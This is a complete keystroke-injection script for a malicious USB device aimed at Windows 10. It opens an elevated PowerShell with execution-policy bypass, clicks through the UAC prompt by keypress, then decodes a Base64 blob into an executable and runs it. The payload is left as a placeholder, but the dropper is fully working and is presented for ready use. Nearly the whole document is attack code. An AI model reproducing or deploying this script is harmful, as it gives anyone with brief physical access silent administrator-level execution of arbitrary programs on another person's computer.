// =============================================================================
// Title: Base64 Decode & Execute
// Author: @beigeworm | https://github.com/beigeworm
// Description: Uses Powershell to decode a Base64 string and then execute the file.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// startup

// *SETUP*
// replace YOUR_BASE64_STRING_HERE_IN_SINGLE_QUOTES and NAME_HERE below.

// =============================================================================

// script setup
layout("us")

// Open Powershell as Admin
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Exec Bypass");
delay(500);
press("CONTROL SHIFT ENTER");
delay(3000);
press("ALT y");
delay(4000);

// Main Powershell code
type("$b64 = 'YOUR_BASE64_STRING_HERE_IN_SINGLE_QUOTES';");
press("ENTER");
delay(500);
type("$decodedFile = [System.Convert]::FromBase64String($b64);");
press("ENTER");
delay(500);
type("$File = \"NAME_HERE\"+\".exe\";");
press("ENTER");
delay(500);
type("Set-Content -Path $File -Value $decodedFile -Encoding Byte;& $File");
press("ENTER");
delay(500);
